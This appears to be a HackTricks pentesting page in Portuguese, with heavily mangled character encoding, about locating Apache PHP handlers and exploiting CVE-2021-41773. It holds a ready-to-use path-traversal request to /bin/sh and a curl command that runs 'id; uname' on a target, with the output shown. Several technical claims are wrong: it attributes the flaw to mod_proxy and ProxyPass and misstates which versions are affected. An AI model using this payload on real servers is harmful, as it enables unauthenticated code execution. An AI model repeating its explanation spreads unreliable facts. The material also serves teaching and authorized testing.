# Extens√µes PHP execut√°veis

Verifique quais extens√µes est√£o sendo executadas pelo servidor Apache. Para procur√°-las, voc√™ pode executar:
```bash
 grep -R -B1 "httpd-php" /etc/apache2
```
Tamb√©m √© poss√≠vel encontrar essa configura√ß√£o em:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
# CVE-2021-41773

## Descri√ß√£o

O CVE-2021-41773 √© uma vulnerabilidade de execu√ß√£o de c√≥digo remoto no Apache HTTP Server. Essa vulnerabilidade permite que um invasor execute c√≥digo malicioso no servidor alvo sem autentica√ß√£o.

## Detalhes

A vulnerabilidade est√° presente em todas as vers√µes do Apache HTTP Server 2.4 anteriores √† 2.4.50 e √© causada por uma falha na diretiva "mod_proxy" do servidor. Essa diretiva √© usada para configurar o m√≥dulo de proxy do Apache, que permite que o servidor atue como um proxy reverso para outros servidores.

A falha ocorre quando a diretiva "ProxyPass" √© usada com um valor de URL malformado. Um invasor pode explorar essa falha enviando uma solicita√ß√£o HTTP GET ou HEAD para o servidor alvo com um valor de URL malformado na solicita√ß√£o. Isso pode levar √† execu√ß√£o de c√≥digo malicioso no servidor alvo.

## Explora√ß√£o

Para explorar essa vulnerabilidade, um invasor pode enviar uma solicita√ß√£o HTTP GET ou HEAD para o servidor alvo com um valor de URL malformado na solicita√ß√£o. O valor de URL malformado deve incluir a sequ√™ncia "%2e" (que representa o caractere "." na codifica√ß√£o URL) duas vezes seguidas.

Por exemplo, a seguinte solicita√ß√£o HTTP GET pode ser usada para explorar a vulnerabilidade:

```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: example.com
```

Essa solicita√ß√£o usa a sequ√™ncia "%2e" para navegar para o diret√≥rio pai do diret√≥rio raiz do servidor e, em seguida, para o diret√≥rio "/bin/sh", que cont√©m o shell do sistema. Isso pode levar √† execu√ß√£o de c√≥digo malicioso no servidor alvo.

## Mitiga√ß√£o

A vulnerabilidade pode ser corrigida atualizando o Apache HTTP Server para a vers√£o 2.4.50 ou posterior. Al√©m disso, os administradores do servidor podem restringir o acesso ao m√≥dulo de proxy do Apache usando a diretiva "Require" para permitir apenas solicita√ß√µes de hosts confi√°veis.
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
